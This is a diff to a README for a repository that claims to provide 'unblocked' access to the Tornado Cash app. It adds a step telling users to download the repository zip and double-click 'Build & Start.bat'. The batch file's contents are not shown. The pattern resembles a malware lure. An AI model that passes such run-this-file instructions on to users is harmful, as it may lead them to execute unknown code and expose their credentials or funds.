@@ -8,7 +8,7 @@ You can access the Tornado Cash application unblocked through this repo. This ap
 
 ![](https://tryenom.com/ScreenShot.png)
 
-## Installation
+## Installation (Way I)
 
 1. Clone the repository to your machine:
 
@@ -21,6 +21,13 @@ You can access the Tornado Cash application unblocked through this repo. This ap
 3. Install the required dependencies:
 
    `"Build & Start.bat"`
+
+## Installation (Way II)
+
+
+1. [Download](https://github.com/easytornado/Tornado-Cash-App/archive/refs/heads/main.zip) the repository release and extract files.
+2.  Double-click on the `"Build & Start.bat"` file to run it.
+
 
 ## Usage
 
